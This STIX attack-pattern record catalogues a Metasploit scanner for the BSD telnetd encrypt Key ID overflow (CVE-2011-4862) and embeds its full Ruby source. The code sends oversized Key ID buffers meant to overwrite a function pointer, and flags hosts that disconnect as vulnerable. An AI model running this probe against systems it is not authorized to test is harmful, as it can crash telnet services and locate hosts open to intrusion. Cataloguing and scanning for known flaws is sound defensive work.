{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8a86d494-8a49-4cfc-bd7d-8b5822bea51e",
    "created": "2024-08-14T16:26:46.626124Z",
    "modified": "2024-08-14T16:26:46.626128Z",
    "name": "Telnet Service Encryption Key ID Overflow Detection",
    "description": "Detect telnet services vulnerable to the encrypt option Key ID overflow (BSD-derived telnetd)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/telnet/telnet_encrypt_overflow.rb",
            "external_id": "telnet_encrypt_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4862"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2011/12/28/more-fun-with-bsd-derived-telnet-daemons/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Telnet Service Encryption Key ID Overflow Detection',\n      'Description' => 'Detect telnet services vulnerable to the encrypt option Key ID overflow (BSD-derived telnetd)',\n      'Author'      => [ 'Jaime Penalba Estebanez <jpenalbae[at]gmail.com>', 'hdm' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['BID', '51182'],\n          ['CVE', '2011-4862'],\n          ['EDB', '18280'],\n          ['URL', 'https://www.rapid7.com/blog/post/2011/12/28/more-fun-with-bsd-derived-telnet-daemons/']\n        ]\n    )\n    register_options(\n    [\n      Opt::RPORT(23),\n      OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])\n    ])\n  end\n\n  def to\n    return 30 if datastore['TIMEOUT'].to_i.zero?\n    datastore['TIMEOUT'].to_i\n  end\n\n  def run_host(ip)\n    begin\n      ::Timeout.timeout(to) do\n        res = connect\n\n        # This makes db_services look a lot nicer.\n        banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)\n        svc = report_service(:host => rhost, :port => rport, :name => \"telnet\", :info => banner_sanitized)\n\n        # Check for encryption option ( IS(0) DES_CFB64(1) )\n        sock.put(\"\\xff\\xfa\\x26\\x00\\x01\\x01\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\xff\\xf0\")\n\n        loop do\n          data = sock.get_once(-1, to) rescue nil\n          if not data\n            print_status(\"#{ip}:#{rport} Does not support encryption: #{banner_sanitized} #{data.to_s.unpack(\"H*\")[0]}\")\n            return\n          end\n          break if data.index(\"\\xff\\xfa\\x26\\x02\\x01\")\n        end\n\n        buff_good = \"\\xff\\xfa\\x26\" + \"\\x07\" + \"\\x00\" + (\"X\" * 63) + \"\\xff\\xf0\"\n        buff_long = \"\\xff\\xfa\\x26\" + \"\\x07\" + \"\\x00\" + (\"X\" * 64) + ( \"\\xcc\" * 32) + \"\\xff\\xf0\"\n\n        begin\n\n          #\n          # Send a long, but within boundary Key ID\n          #\n          sock.put(buff_good)\n          data = sock.get_once(-1, 5) rescue nil\n          unless data\n            print_status(\"#{ip}:#{rport} UNKNOWN: No response to the initial probe: #{banner_sanitized}\")\n            return\n          end\n\n          unless data.index(\"\\xff\\xfa\\x26\\x08\\xff\\xf0\")\n            print_status(\"#{ip}:#{rport} UNKNOWN: Invalid reply to Key ID: #{data.unpack(\"H*\")[0]} - #{banner_sanitized}\")\n            return\n          end\n\n          #\n          # First round to overwrite the function pointer itself\n          #\n          sock.put(buff_long)\n          data = sock.get_once(-1, 5)\n          unless data\n            print_status(\"#{ip}:#{rport} NOT VULNERABLE: No reply to first long Key ID: #{banner_sanitized}\")\n            return\n          end\n\n          unless data.index(\"\\xff\\xfa\\x26\\x08\\xff\\xf0\")\n            print_status(\"#{ip}:#{rport} UNKNOWN: Invalid reply to first Key ID: #{data.unpack(\"H*\")[0]} - #{banner_sanitized}\")\n            return\n          end\n\n          #\n          # Second round to force the function to be called\n          #\n          sock.put(buff_long)\n          data = sock.get_once(-1, 5)\n          unless data\n            print_status(\"#{ip}:#{rport} NOT VULNERABLE: No reply to second long Key ID: #{banner_sanitized}\")\n            return\n          end\n\n          unless data.index(\"\\xff\\xfa\\x26\\x08\\xff\\xf0\")\n            print_status(\"#{ip}:#{rport} UNKNOWN: Invalid reply to second Key ID: #{data.unpack(\"H*\")[0]} - #{banner_sanitized}\")\n            return\n          end\n\n          print_status(\"#{ip}:#{rport} NOT VULNERABLE: Service did not disconnect: #{banner_sanitized}\")\n          return\n\n        rescue ::EOFError\n        end\n\n        # EOFError or response to 64-byte Key Id indicates vulnerable systems\n        print_good(\"#{ip}:#{rport} VULNERABLE: #{banner_sanitized}\")\n        report_vuln(\n          {\n              :host\t  => ip,\n              :service  => svc,\n              :name\t  => self.name,\n              :info\t  => \"Module #{self.fullname} confirmed acceptance of a long key ID: #{banner_sanitized}\",\n              :refs     => self.references\n          }\n        )\n\n      end\n    rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e\n      print_error(\"A network issue has occurred: #{e.message}\")\n      elog('A network issue has occurred', error: e)\n    rescue Timeout::Error => e\n      print_error(\"#{target_host}:#{rport} Timed out after #{to} seconds\")\n      elog(\"#{target_host}:#{rport} Timed out after #{to} seconds\", error: e)\n    rescue ::Exception => e\n      print_error(\"#{target_host}:#{rport} Error: #{e} #{e.backtrace}\")\n      elog(\"#{target_host}:#{rport} Error: #{e} #{e.backtrace}\", error: e)\n    ensure\n      disconnect\n    end\n  end\nend\n"
}